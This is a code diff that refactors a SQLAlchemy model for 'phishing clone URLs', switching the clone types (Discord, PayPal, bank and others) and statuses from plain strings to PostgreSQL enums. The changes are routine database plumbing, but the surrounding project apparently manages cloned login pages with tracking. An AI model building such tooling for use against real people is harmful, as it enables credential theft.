@@ -1,25 +1,25 @@
 from datetime import datetime, timedelta
 from app import db
 from enum import Enum
+from sqlalchemy import Enum as SQLEnum
 
 class CloneType(Enum):
-    DISCORD = 'discord'
-    FACEBOOK = 'facebook'
-    GOOGLE = 'google'
-    MICROSOFT = 'microsoft'
-    APPLE = 'apple'
-    TWITTER = 'twitter'
-    INSTAGRAM = 'instagram'
-    LINKEDIN = 'linkedin'
-    BANKING = 'banking'
-    CORPORATE = 'corporate'
-    OTHER = 'other'
+    DISCORD = 'DISCORD'
+    FACEBOOK = 'FACEBOOK'
+    INSTAGRAM = 'INSTAGRAM'
+    YOUTUBE = 'YOUTUBE'
+    TWITTER = 'TWITTER'
+    TWITCH = 'TWITCH'
+    GMAIL = 'GMAIL'
+    LINKEDIN = 'LINKEDIN'
+    PAYPAL = 'PAYPAL'
+    BANK = 'BANK'
+    OTHER = 'OTHER'
 
 class CloneStatus(Enum):
-    ACTIVE = 'active'
-    INACTIVE = 'inactive'
-    MAINTENANCE = 'maintenance'
-    ARCHIVED = 'archived'
+    ACTIVE = 'ACTIVE'
+    INACTIVE = 'INACTIVE'
+    MAINTENANCE = 'MAINTENANCE'
 
 class Clone(db.Model):
     """Model for managing phishing clone URLs"""
@@ -29,17 +29,17 @@ class Clone(db.Model):
     name = db.Column(db.String(200), nullable=False)  # e.g., "Discord Security Team"
     description = db.Column(db.Text, nullable=True)
     
-    # Clone configuration - FIXED: Use String instead of Enum for PostgreSQL compatibility
-    clone_type = db.Column(db.String(50), nullable=False)  # Store enum value as string
-    status = db.Column(db.String(20), default='active', nullable=False)  # Store enum value as string
+    # Clone configuration - Use proper SQLAlchemy Enum that maps to PostgreSQL enum
+    clone_type = db.Column(SQLEnum(CloneType, name='clonetype'), nullable=False)
+    status = db.Column(SQLEnum(CloneStatus, name='clonestatus'), default=CloneStatus.ACTIVE, nullable=False)
     
     # URLs
     base_url = db.Column(db.String(500), nullable=False)  # e.g., "https://discord-clone-tau-smoky.vercel.app"
     landing_path = db.Column(db.String(200), default='/', nullable=False)  # e.g., "/login" or "/"
     
     # Display configuration
-    icon = db.Column(db.String(10), default='🌐', nullable=False)  # Emoji icon for display
-    button_color = db.Column(db.String(20), default='blue', nullable=False)  # Tailwind color class
+    icon = db.Column(db.String(50), default='🌐', nullable=False)  # Emoji icon for display
+    button_color = db.Column(db.String(50), default='blue', nullable=False)  # Tailwind color class
     
     # Tracking configuration
     uses_universal_tracking = db.Column(db.Boolean, default=True, nullable=False)  # Whether it uses universal-tracking.js
@@ -164,8 +164,8 @@ class Clone(db.Model):
             'id': self.id,
             'name': self.name,
             'description': self.description,
-            'clone_type': self.clone_type,
-            'status': self.status,
+            'clone_type': self.clone_type.value if self.clone_type else None,
+            'status': self.status.value if self.status else None,
             'base_url': self.base_url,
             'landing_path': self.landing_path,
             'icon': self.icon,
@@ -183,7 +183,7 @@ class Clone(db.Model):
     def get_active_clones():
         """Get all active clones"""
         try:
-            return Clone.query.filter_by(status='active').order_by(Clone.name).all()
+            return Clone.query.filter_by(status=CloneStatus.ACTIVE).order_by(Clone.name).all()
         except Exception as e:
             # Handle case where table doesn't exist yet during initialization
             print(f"⚠️  Could not query clones table: {e}")
@@ -193,7 +193,7 @@ class Clone(db.Model):
     def get_clones_by_type(clone_type):
         """Get clones by type"""
         try:
-            return Clone.query.filter_by(clone_type=clone_type, status='active').all()
+            return Clone.query.filter_by(clone_type=clone_type, status=CloneStatus.ACTIVE).all()
         except Exception as e:
             print(f"⚠️  Could not query clones table: {e}")
             return []
@@ -202,7 +202,7 @@ class Clone(db.Model):
     def find_by_type_and_url(clone_type, base_url=None):
         """Find clone by type and optionally by URL"""
         try:
-            query = Clone.query.filter_by(clone_type=clone_type, status='active')
+            query = Clone.query.filter_by(clone_type=clone_type, status=CloneStatus.ACTIVE)
             if base_url:
                 query = query.filter(Clone.base_url.contains(base_url))
             return query.first()
@@ -213,17 +213,21 @@ class Clone(db.Model):
     @staticmethod
     def create_clone_from_data(data, user_id):
         """Create a new clone from form data"""
-        # Validate clone_type
-        clone_type = data.get('clone_type')
-        valid_clone_types = ['discord', 'facebook', 'google', 'microsoft', 'apple', 'twitter', 'instagram', 'linkedin', 'banking', 'corporate', 'other']
-        if clone_type not in valid_clone_types:
-            clone_type = 'other'
+        # Validate clone_type - convert string to enum
+        clone_type_str = data.get('clone_type', '').upper()
+        try:
+            clone_type = CloneType(clone_type_str) if clone_type_str else CloneType.OTHER
+        except ValueError:
+            # If the provided value is not valid, default to OTHER
+            clone_type = CloneType.OTHER
         
-        # Validate status
-        status = data.get('status', 'active')
-        valid_statuses = ['active', 'inactive', 'maintenance', 'archived']
-        if status not in valid_statuses:
-            status = 'active'
+        # Validate status - convert string to enum
+        status_str = data.get('status', 'ACTIVE').upper()
+        try:
+            status = CloneStatus(status_str) if status_str else CloneStatus.ACTIVE
+        except ValueError:
+            # If the provided value is not valid, default to ACTIVE
+            status = CloneStatus.ACTIVE
         
         clone = Clone(
             name=data.get('name'),
